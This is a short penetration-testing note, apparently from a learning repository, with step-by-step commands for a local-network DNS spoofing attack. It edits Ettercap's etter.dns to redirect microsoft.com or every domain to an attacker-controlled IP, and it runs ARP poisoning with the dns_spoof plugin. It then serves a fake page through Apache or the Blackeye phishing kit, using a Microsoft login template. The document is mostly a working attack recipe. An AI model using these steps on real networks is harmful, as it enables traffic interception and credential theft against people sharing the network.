# author: huangyuhui
# date: november 27,2019
# envir: 5.2.0-kali2
# desc: the detailed steps about the dns attack
# repo address: https://github.com/yubuntu0109/penetration-testing-learning
# tested on the mobile browser: [vivo],[xiaomi],[huawei],[quark],[firefox],[qq],[360],[sogou],,


'''GUI: THE DETAILED STEPS ABOUT THE DNS ATTACK

[step one]: customize the dns configuration infos of Ettercap
>>> vim ./etc/ettercap/etter.dns
----------------------------------------------------------------------------------------------
eg: modify the dns configuration infos as follow,let it redirect to specified service address
==============================================================================================
microsoft.com			A		xxx.xxx.xxx.xxx (your service ip)
.*microsoft.com			A		xxx.xxx.xxx.xxx
www.microsoft.com		PRT  	xxx.xxx.xxx.xxx
----------------------------------------------------------------------------------------------
ex: add the new configuration infos as follow if you want intercept all of websites
==============================================================================================
*		A		xxx.xxx.xxx.xxx (your service ip)
*		PTR 	xxx.xxx.xxx.xxx
----------------------------------------------------------------------------------------------


[step two]: MitM Attack(arp poisoning) and DNS spoofing by the penetration testing tool of Ettercap
>>> ettercap -G 


[step three]: customize the index page and start the local server of Apache
>>> vim ./var/www/html/index.html
>>> /etc/init.d/apache2 start	# or use this command >>> service apache2 start

(recommend)use the penetration testing tool of Blackeye to replace the service of Apache or others..
>>> https://github.com/YUbuntu0109/blackeye
--------------------------------------------------------------------------------------------------------
becaues you have modified the dns configuraiton infos above,so please test on this option: [16]Microsoft
--------------------------------------------------------------------------------------------------------


[step four]: check the specified service ip with this command
>>> nslookup www.microsoft.com
'''



'''(RECOMMEND)COMMAND: THE DETAILED STEPS ABOUT DNS ATTACK

[step one]: it's same as the first step above
>>> vim ./etc/ettercap/etter.dns


[step two]: MitM attack(arp poisoning) and dns spoofing by the penetration testing tool of Ettercap
the ip address between the target and the gateway is unordered
>>> ettercap -i <iface> -Tq -M arp:remote -P dns_spoof /[target1]// /[target2]//


[step three]: it's same as the third step above and the penetration tool of Blackeye is recommended
>>> git clone https://github.com/YUbuntu0109/blackeye


[step four]: it's same as the fourth step above
>>> nslookup www.sitename.com
'''



'''PENETRATION TESTING TOOL

Ettercap: https://github.com/Ettercap/ettercap
Blackeye: https://github.com/thelinuxchoice/blackeye
'''

